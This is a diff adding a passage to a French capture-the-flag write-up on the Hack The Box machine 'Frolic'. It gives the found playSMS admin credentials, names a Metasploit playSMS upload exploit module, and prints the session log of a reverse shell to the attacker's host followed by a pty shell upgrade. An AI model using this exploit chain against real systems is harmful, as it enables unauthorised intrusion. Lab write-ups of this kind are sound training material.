@@ -165,4 +165,23 @@ Donc après avoir chercher pendant quelques temps, j'ai réussis à me connecter
 Username : admin</br>
 Password : idkwhatispass<br/>
 
+Donc nous pouvons maintenant attaquer pour avoir notre shell grâce à metasploit, car il y'a un exploit spécifique pour playsms, je vous ferais un petit tutorial pour vous montrez comment faire ça manuellement. L'exploit se nomme : exploit/multi/http/playsms_uploadcsv_exec
 
+Shell > User.txt
+----
+    [*] Started reverse TCP handler on 10.10.14.98:4444 
+    [+] Authentication successful: admin:idkwhatispass
+    [*] Sending stage (38247 bytes) to 10.10.10.111
+    [*] Meterpreter session 1 opened (10.10.14.98:4444 -> 10.10.10.111:45836) at 2019-03-23 14:00:25 +0100
+
+    meterpreter > shell
+    Process 2062 created.
+    Channel 0 created.
+    python -c "import pty;pty.spawn('/bin/bash')"
+    www-data@frolic:~/html/playsms$ cd /home/ayush
+    www-data@frolic:/home/ayush$ wc -c user.txt
+    33 user.txt
+    
+    
+    
+    
